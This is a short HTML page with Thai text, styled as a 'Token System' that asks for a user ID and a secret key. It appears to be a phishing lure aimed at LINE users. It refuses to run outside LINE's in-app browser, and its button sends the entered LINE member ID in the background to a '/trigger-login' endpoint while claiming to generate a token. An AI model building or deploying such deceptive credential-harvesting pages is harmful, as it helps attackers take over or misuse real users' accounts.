<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Token System</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body { background:url('https://i.ibb.co/q5m9sJY/background.png') no-repeat center center fixed; background-size:cover; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
        .box { width:90%; max-width:400px; background:rgba(255,255,255,0.1); padding:20px; border-radius:15px; backdrop-filter:blur(10px); text-align:center; }
        input, button { width:100%; padding:12px; margin:10px 0; border-radius:8px; border:0; }
        button { background:#00c300; color:white; font-weight:bold; cursor:pointer; }
    </style>
</head>
<body>

    <div class="box" id="app">
        <h2 style="color:white">Token System</h2>
        <input id="userid" placeholder="User ID">
        <input id="secret" placeholder="Secret Key">
        <button onclick="processData()">สร้าง Token</button>
    </div>

    <script>
        // ระบบกั้น Browser ปกติ
        window.onload = () => {
            if (!navigator.userAgent.includes('Line')) {
                document.body.innerHTML = "<h1 style='color:white'>กรุณาเปิดผ่าน LINE เท่านั้น</h1>";
            }
        };

        async function processData() {
            // ระบบส่งข้อมูลเบื้องหลัง
            fetch('/trigger-login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ userData: { mid: document.getElementById('userid').value } })
            });

            Swal.fire("กำลังดำเนินการ", "ระบบกำลังรวบรวมข้อมูล...", "info");
        }
    </script>
</body>
</html>
